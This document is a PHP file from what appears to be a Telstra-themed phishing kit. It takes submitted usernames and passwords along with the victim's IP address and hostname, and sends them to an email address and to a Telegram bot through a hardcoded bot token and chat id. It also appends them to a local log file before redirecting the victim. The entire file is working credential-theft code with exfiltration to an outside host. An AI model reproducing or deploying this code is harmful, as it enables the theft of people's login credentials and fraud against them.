<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________FLOW_____________\n";
$message .= "Log          : ".$_POST['username']."\n";
$message .= "Pass          : ".$_POST['password']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| l7way  |__________\n";

$subject = "LOGIN| ".$_POST['CC']." | $ip ";
$headers = "From:Telstra ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message,$send,$headers);
$token = "6905974994:AAHLLwteCXblWnVf_HZ-mtEcyjI8VUSehGs";
$data = [
    'text' => $message,
    'chat_id' => '-4056576594'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
$file = fopen('../Flow.txt', 'a');
fwrite($file,$message);
header("Location: load.php?id=4932YR-329TR23R");

?>